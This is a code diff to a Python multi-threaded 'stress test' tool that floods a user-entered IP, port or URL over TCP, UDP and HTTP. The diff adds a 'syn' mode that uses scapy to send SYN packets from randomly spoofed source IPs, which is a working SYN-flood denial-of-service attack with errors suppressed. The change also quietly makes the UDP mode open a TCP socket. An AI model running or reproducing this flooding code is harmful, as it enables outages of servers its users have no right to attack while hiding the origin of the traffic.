@@ -4,17 +4,18 @@ import socket
 import threading
 import time
 from colorama import Fore, Style, init
+from scapy.all import *
 
 # Initialize colorama
 init()
 
 # Set the protocol/method to use for sending requests
-protocol = input("Enter the protocol/method to use (tcp, udp, get, head, or cfb): ")
+protocol = input("Enter the protocol/method to use (tcp, udp, get, head, cfb, or syn): ")
 
 if protocol in ["get", "head", "cfb"]:
     # Set the URL of the website to test
     url = input("Enter the website URL (including http or https): ")
-elif protocol in ["tcp", "udp"]:
+elif protocol in ["tcp", "udp", "syn"]:
     # Set the IP address and port of the server to test
     ip = input("Enter the IP address of the server: ")
     port = int(input("Enter the port number: "))
@@ -42,10 +43,8 @@ def stress_test(thread_id):
         client = cloudscraper.create_scraper()
     elif protocol in ["get", "head"]:
         client = httpx.Client()
-    elif protocol == "tcp":
+    elif protocol in ["tcp", "udp", "syn"]:
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    elif protocol == "udp":
-        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     else:
         print(Fore.RED + f"Invalid protocol: {protocol}" + Style.RESET_ALL)
         return
@@ -55,7 +54,7 @@ def stress_test(thread_id):
     if thread_id == 0:
         if protocol in ["get", "head", "cfb"]:
             print(Fore.YELLOW + f"Stressing started on {url} successfully!" + Style.RESET_ALL)
-        elif protocol in ["tcp", "udp"]:
+        elif protocol in ["tcp", "udp", "syn"]:
             print(Fore.YELLOW + f"Stressing started on {ip}:{port} successfully!" + Style.RESET_ALL)
     while time.time() - start_time < duration:
         if protocol in ["get", "head", "cfb"]:
@@ -64,6 +63,8 @@ def stress_test(thread_id):
             send_packet(sock)
             with packet_counter_lock:
                 packet_counter += 1
+        elif protocol == "syn":
+            send_syn(thread_id)
         if thread_id == 0 and time.time() - last_print_time >= 10:
             with packet_counter_lock:
                 print(f"Sent {packet_counter} packets to {ip}:{port}")
@@ -90,6 +91,19 @@ def send_packet(sock):
             sock.sendto(b"X" * packet_size, (ip, port)) # Send a packet with maximum size
     except Exception as e:
         pass # Suppress error messages
+
+def send_syn(thread_id):
+    global packet_counter
+
+    ip_layer = IP(src=RandIP("*.*.*.*"), dst=ip)
+    tcp_layer = TCP(sport=RandShort(), dport=port, flags="S")
+    raw_layer = Raw(b"X"*1024)
+    p = ip_layer / tcp_layer / raw_layer
+
+    send(p, verbose=0)
+
+    with packet_counter_lock:
+        packet_counter += 1
 
 # Create and start the threads
 threads = []
